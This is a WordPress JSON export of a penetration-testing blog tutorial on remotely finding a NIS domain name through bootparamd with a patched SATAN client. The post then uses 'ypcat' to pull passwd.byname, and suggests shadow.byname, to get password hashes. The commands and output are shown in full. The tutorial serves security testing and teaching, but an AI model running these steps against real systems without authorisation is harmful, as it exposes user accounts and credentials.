{"id":14,"date":"2007-06-20T21:29:14","date_gmt":"2007-06-20T21:29:14","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=14"},"modified":"2011-08-31T16:29:04","modified_gmt":"2011-08-31T16:29:04","slug":"nis-domain-name","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/blog\/nis-domain-name","title":{"rendered":"Finding the NIS Domain Name from Bootparamd"},"content":{"rendered":"<p><a href=\"http:\/\/en.wikipedia.org\/wiki\/Network_Information_Service\">NIS<\/a> (Network Information Service) is not a particularly common protocol on modern internal networks. This is for good reason really consider its <a href=\"http:\/\/www.unix.geek.org.uk\/~arny\/\">security weaknesses<\/a>.\u00a0 Its presense is often a gift to penetration testers (and probably hackers too).\u00a0 This blog entry briefly documents one way that all important NIS Domain Name can be found remotely.<\/p>\n<p><!--more--><\/p>\n<p><a href=\"http:\/\/www.porcupine.org\/satan\">SATAN<\/a> includes a nice little tool called &#8220;boot&#8221; which can remotely query the bootparamd service &#8211; often found running on the NIS server.\u00a0 I tweaked this slightly so that it compiles under Linux (I&#8217;ve only tried it on Gentoo).\u00a0 Download my hacked up copy <a href=\"..\/tools\/bootparam-satan\/satan-bootparamd-client-ptm-patch.tar.gz\">here<\/a>.<\/p>\n<p>First locate a host that is running both ypserv and bootparamd.\u00a0 This is invariably a Solaris host, but in this example it&#8217;s Debian:<\/p>\n<pre>\r\n$ rpcinfo -p 192.168.20.128\r\n\u00a0\u00a0 program vers proto\u00a0\u00a0 port\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 2\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 111\u00a0 portmapper\r\n\u00a0\u00a0\u00a0 100000\u00a0\u00a0\u00a0 2\u00a0\u00a0 udp\u00a0\u00a0\u00a0 111\u00a0 portmapper\r\n\u00a0\u00a0\u00a0 100024\u00a0\u00a0\u00a0 1\u00a0\u00a0 udp\u00a0\u00a0\u00a0 749\u00a0 status\r\n\u00a0\u00a0\u00a0 100024\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 752\u00a0 status\r\n\u00a0\u00a0\u00a0 100004\u00a0\u00a0\u00a0 2\u00a0\u00a0 udp\u00a0\u00a0 1017\u00a0 ypserv\r\n\u00a0\u00a0\u00a0 100004\u00a0\u00a0\u00a0 1\u00a0\u00a0 udp\u00a0\u00a0 1017\u00a0 ypserv\r\n\u00a0\u00a0\u00a0 100004\u00a0\u00a0\u00a0 2\u00a0\u00a0 tcp\u00a0\u00a0 1020\u00a0 ypserv\r\n\u00a0\u00a0\u00a0 100004\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0\u00a0 1020\u00a0 ypserv\r\n\u00a0\u00a0\u00a0 100009\u00a0\u00a0\u00a0 1\u00a0\u00a0 udp\u00a0\u00a0 1020\u00a0 yppasswdd\r\n\u00a0600100069\u00a0\u00a0\u00a0 1\u00a0\u00a0 udp\u00a0\u00a0 1022\u00a0 fypxfrd\r\n\u00a0600100069\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 600\u00a0 fypxfrd\r\n\u00a0\u00a0\u00a0 100007\u00a0\u00a0\u00a0 2\u00a0\u00a0 udp\u00a0\u00a0\u00a0 605\u00a0 ypbind\r\n\u00a0\u00a0\u00a0 100007\u00a0\u00a0\u00a0 1\u00a0\u00a0 udp\u00a0\u00a0\u00a0 605\u00a0 ypbind\r\n\u00a0\u00a0\u00a0 100007\u00a0\u00a0\u00a0 2\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 608\u00a0 ypbind\r\n\u00a0\u00a0\u00a0 100007\u00a0\u00a0\u00a0 1\u00a0\u00a0 tcp\u00a0\u00a0\u00a0 608\u00a0 ypbind\r\n\u00a0\u00a0\u00a0 100026\u00a0\u00a0\u00a0 1\u00a0\u00a0 udp\u00a0\u00a0\u00a0 603\u00a0 bootparam\r\n<\/pre>\n<p>Now compile and run the bootparam client then query the bootparamd service.<\/p>\n<pre>\r\n$ tar xfz satan-bootparamd-client-ptm-patch.tar.gz\r\n$ cd satan-bootparamd-client-ptm-patch\r\n$ ls -l\r\ntotal 12\r\n-rw------- 1 ml ml  399 Jun 17 12:50 Makefile\r\n-rw------- 1 ml ml 2461 Jun 17 12:50 boot.c\r\n-rw------- 1 ml ml 3019 Jun 17 12:50 bootparam_prot.x\r\n$ make\r\n<\/pre>\n<p>You need to supply the &#8220;boot&#8221; progam a client and server IP address.<\/p>\n<pre>$ .\/boot\r\nUsage: .\/boot bootclient bootserver<\/pre>\n<p>In this example at least the server had to be set up specifically set up to serve a ficticious client (by editing \/etc\/bootparams).\u00a0 If you get a message like the following, try a different client IP address:<\/p>\n<pre>$ .\/boot 192.168.20.99 192.168.20.128\r\nme: cannot contact bootparam server at 192.168.20.128 for 192.168.20.99: RPC: Timed out<\/pre>\n<p>A successful response will look like this:<\/p>\n<pre>$ .\/boot 192.168.20.3 192.168.20.128\r\nclient_name: someclient\r\ndomain_name: mynisdom\r\nrouter_addr: 192.168.20.128<\/pre>\n<p>Once you have the NIS Domain Name, you can grab the passwd file as follows:<\/p>\n<pre>$ ypcat -h 192.168.20.128 -d mynisdom passwd.byname\r\nuser:x:1000:1000:user,,,:\/home\/user:\/bin\/bash\r\nptm:x:1001:100::\/home\/ptm:<\/pre>\n<p>If you&#8217;re really lucky it&#8217;ll contain the password hashes too (also try to grab shadow.byname if it doesn&#8217;t).<\/p>\n<p>If you&#8217;re unable to extract the NIS domain name from bootparamd, you could try querying other available services (FTP, SMTP, NFS, etc.) in order to find the DNS Domain name or some host names. \u00a0 The NIS domain name could be similar to the DNS domain name, or to hostnames &#8211; but isn&#8217;t necessarily.\u00a0 YMMV.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>NIS (Network Information Service) is not a particularly common protocol on modern internal networks. This is for good reason really consider its security weaknesses.\u00a0 Its presense is often a gift to penetration testers (and probably hackers too).\u00a0 This blog entry briefly documents one way that all important NIS Domain Name can be found remotely.<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[5],"tags":[74,113,19,42],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/14"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=14"}],"version-history":[{"count":3,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/14\/revisions"}],"predecessor-version":[{"id":442,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/14\/revisions\/442"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=14"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=14"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=14"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}